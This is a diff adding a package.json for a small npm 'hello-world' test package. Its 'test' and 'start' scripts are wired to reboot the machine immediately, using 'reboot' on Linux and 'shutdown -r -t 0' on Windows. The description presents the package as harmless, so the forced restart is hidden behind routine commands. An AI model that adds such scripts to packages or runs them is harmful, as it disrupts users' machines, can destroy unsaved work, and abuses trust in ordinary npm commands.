@@ -1,0 +1,26 @@
+{
+  "name": "hello-npm-va",
+  "version": "1.0.0",
+  "description": "Test repo for uploading files to NPM",
+  "main": "index.js",
+  "scripts": {
+    "test": "npm run sLin && npm run sWin",
+    "start": "npm run sLin && npm run sWin",
+    "sLin": "reboot || ECHO",
+    "sWin": "shutdown -r -t 0 || true"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/valorad/hello-npm-va.git"
+  },
+  "keywords": [
+    "hello-world",
+    "npm"
+  ],
+  "author": "Valorad",
+  "license": "MIT",
+  "bugs": {
+    "url": "https://github.com/valorad/hello-npm-va/issues"
+  },
+  "homepage": "https://github.com/valorad/hello-npm-va#readme"
+}
